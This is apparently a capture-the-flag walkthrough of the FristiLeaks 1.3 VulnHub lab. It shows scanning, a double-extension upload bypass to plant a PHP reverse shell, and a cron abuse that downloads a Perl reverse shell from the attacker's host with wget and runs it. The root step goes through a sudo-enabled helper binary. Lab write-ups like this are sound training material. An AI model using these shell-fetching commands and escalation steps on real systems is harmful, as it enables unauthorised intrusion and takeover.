# FRISTILEAKS: 1.3

## 1.Get VM IP

```bash
root@kali: nmap -sn 192.168.127.0/24

Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-05 01:18 EDT
Nmap scan report for 192.168.127.1
Host is up (0.00018s latency).
MAC Address: 00:50:56:C0:00:01 (VMware)
Nmap scan report for 192.168.127.135
Host is up (0.00056s latency).
MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.127.254
Host is up (0.00049s latency).
MAC Address: 00:50:56:F4:78:0D (VMware)
Nmap scan report for 192.168.127.128
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 15.07 seconds
```

The IP address is `192.168.127.135`, let's scan it.

## 2.Enumeration

```bash
root@kali: nmap -sV -sC 192.168.127.135 -oN nmapresult

Nmap scan report for 192.168.127.135
Host is up (0.00025s latency).
Not shown: 989 filtered tcp ports (no-response), 10 filtered tcp ports (host-prohibited)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
| http-robots.txt: 3 disallowed entries 
|_/cola /sisi /beer
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.12 seconds
```
The only open port here is `80`, from the nmap report we see `robots.txt` has 3 routes

navigating to these directories shows the same content :

![page](https://github.com/Git-K3rnel/VulnHub/assets/127470407/2d1e90c6-1d88-4740-8469-f6c61cdbe270)

i started fuzzing the application with different methods but found nothing except `/images/` and `/icons/` directory that had nothing intersting.

back to the main page saying "KEEP CALM AND DRINK FRISTI", the word `fristi` was weird for me so tried navigating to `fristi` :

![fristipage](https://github.com/Git-K3rnel/VulnHub/assets/127470407/86780385-6f4b-4857-9104-30b6d7043aea)

yes, we found a login page, i tried some sql injection payloads but did not work.

viewing the page source :

![pagesource](https://github.com/Git-K3rnel/VulnHub/assets/127470407/8cc548d1-f8b8-434e-aa7d-2e33b2f66633)

the comment here is by `eezeepz`, maybe a username ? write it down.

scrolling down a little shows base64 data image :


![datablob](https://github.com/Git-K3rnel/VulnHub/assets/127470407/606d6e18-a4a9-46d1-984b-e566391651c3)

convert it back to image using an online service or browser itself :

![kekek](https://github.com/Git-K3rnel/VulnHub/assets/127470407/bfffc291-b028-4751-9678-e301cc6def0d)

using `eezeepz` as user and the string in the picture `keKkeKKeKKeKkEkkEk` you can login to website :

![login](https://github.com/Git-K3rnel/VulnHub/assets/127470407/5b34ac61-581a-42ee-b6bf-0c18c48db81a)

## 3.Gaining Shell

Here we see an upload functionality that only allows uploading `png,jpg,gif` files, after trying afew methods to bypass it

i found that it checks only the last extention of a file, for example `test.php.png` is acceptable. so i uploaded a php reverse shell

navigated to `/uploads/test.php.png` directory, with a listener on my system i got the shell :

![shell1](https://github.com/Git-K3rnel/VulnHub/assets/127470407/ed033369-cd57-468d-93b6-d6dfabdba2e7)

in `/var/www` there is a file `notes.txt` :
```bash
bash-4.1$ cat notes.txt
hey eezeepz your homedir is a mess, go clean it up, just dont delete
the important stuff.

-jerry
```

as jerry says here the home dir of user eezeepz is a mess.

navigate to `/home` directory and there are 3 users here and we can only access the eezeepz directory

in this directory there is a `notes.txt` again :

```bash
bash-4.1$ cat notes.txt
Yo EZ,

I made it possible for you to do some automated checks, 
but I did only allow you access to /usr/bin/* system binaries. I did
however copy a few extra often needed commands to my 
homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
from /home/admin/

Don't forget to specify the full path for each binary!

Just put a file called "runthis" in /tmp/, each line one command. The 
output goes to the file "cronresult" in /tmp/. It should 
run every minute with my account privileges.

- Jerry
```
as it seems in this note admin provides us afew capabilities :
- we can run all binaries in `/usr/bin/`
- we can run afew binaries in `/home/admin/`
- we should create a file called `runthis` in `/tmp/` and put our commands into this file
- the "runthis" file will be executed with admin privileges every one minute
- the result will be saved in `cronresult` file

so what is better than another reverse shell ?

## Privilege Escalation to admin user

I prepared another reverse shell, this time a perl reverse shell in my kali machine

because `perl` binary exist in `/usr/bin` directory and we can execute it :

```bash
root@kali: ls
revshell.pl
root@kali: python -m http.server 80
bash-4.1$ cd /tmp
bash-4.1$ wget http://192.168.127.128/revshell.pl
bash-4.1$ echo '/usr/bin/perl /tmp/revshell.pl' > runthis
```

and yes we got the shell with admin privileges :


![shell2](https://github.com/Git-K3rnel/VulnHub/assets/127470407/1c6d7bc4-3db4-4e55-82d6-3cc29d66cabf)

we navigate to `/home/admin` directory and there are afew files here :

```bash
admin@localhost ~]$ ls -l
total 632
-rwxr-xr-x 1 admin     admin      45224 Nov 18  2015 cat
-rwxr-xr-x 1 admin     admin      48712 Nov 18  2015 chmod
-rw-r--r-- 1 admin     admin        737 Nov 18  2015 cronjob.py
-rw-r--r-- 1 admin     admin         21 Nov 18  2015 cryptedpass.txt
-rw-r--r-- 1 admin     admin        258 Nov 18  2015 cryptpass.py
-rwxr-xr-x 1 admin     admin      90544 Nov 18  2015 df
-rwxr-xr-x 1 admin     admin      24136 Nov 18  2015 echo
-rwxr-xr-x 1 admin     admin     163600 Nov 18  2015 egrep
-rwxr-xr-x 1 admin     admin     163600 Nov 18  2015 grep
-rwxr-xr-x 1 admin     admin      85304 Nov 18  2015 ps
-rw-r--r-- 1 fristigod fristigod     25 Nov 19  2015 whoisyourgodnow.txt
```

interesting files are :
- whoisyourgodnow.txt
- cryptedpass.txt
- cryptpass.py

we look at all of these files :

```bash
[admin@localhost ~]$ cat whoisyourgodnow.txt
=RFn0AKnlMHMPIzpyuTI0ITG

[admin@localhost ~]$ cat cryptedpass.txt
mVGZ3O3omkJLmy2pcuTq

[admin@localhost ~]$ cat cryptpass.py
#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
import base64,codecs,sys

def encodeString(str):
    base64string= base64.b64encode(str)
    return codecs.encode(base64string[::-1], 'rot13')

cryptoResult=encodeString(sys.argv[1])
print cryptoResult
```

it seems the python file is using base64 to encode the input and then `rot13` algorithm. and the other 2 files are the output of this python function.

we need to reverse the process so i write a python script to reverse it :

```python
import base64,codecs,sys

def decoodeString(str):
    decode = codecs.decode(str[::-1], 'rot13')
    return base64.b64decode(decode)

cryptoResult=decoodeString(sys.argv[1])
print(cryptoResult)
```

now we pass this function the content of the other two files :

```python
python decode.py =RFn0AKnlMHMPIzpyuTI0ITG
b'LetThereBeFristi!'

python decode.py mVGZ3O3omkJLmy2pcuTq
b'thisisalsopw123'
```

## Privilege Escalation to fristigod user

Now that we have decoded the strings, we can change the user to `fristigod` with the password `LetThereBeFristi!` :

```bash
[admin@localhost ~]$ su fristigod
Password: 
bash-4.1$ id
uid=502(fristigod) gid=502(fristigod) groups=502(fristigod)
bash-4.1$
```

now we are user fristigod, so we check our privileges on files and folders :

```bash
bash-4.1$ find / -user fristigod -o -group fristigod 2> /dev/null

/home/fristigod
/home/fristigod/.bash_logout
/home/fristigod/.bashrc
/home/fristigod/.bash_profile
/var/spool/mail/fristigod
/var/fristigod
/var/fristigod/.bash_history
/var/fristigod/.secret_admin_stuff
```

## Privilege Escalation to root

Interesting!! there is two hidden files in `/var/fristigod`, examining the `.bash_history` shows previous commands :

```bash
bash-4.1$ cd /var/fristigod
bash-4.1$ cat .bash_history
```

this line draws my attenstion : `sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /`

we figure out that there is a `doCom` binary in `.secret_admin_stuff` that is using sudo privileges to run a command

so we can run any command with this binary :

```bash
bash-4.1# bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom bash -p
[sudo] password for fristigod: 
bash-4.1# id
uid=0(root) gid=100(users) groups=100(users),502(fristigod)
bash-4.1#
```
yes, we are now the root user, let's navigate to `/root` and read the flag :

```bash
bash-4.1# cd /root
bash-4.1# cat fristileaks_secrets.txt 
Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]

I wonder if you beat it in the maximum 4 hours it's supposed to take!

Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)


Flag: Y0u_kn0w_y0u_l0ve_fr1st1
```

This is how you can pawn this box :)

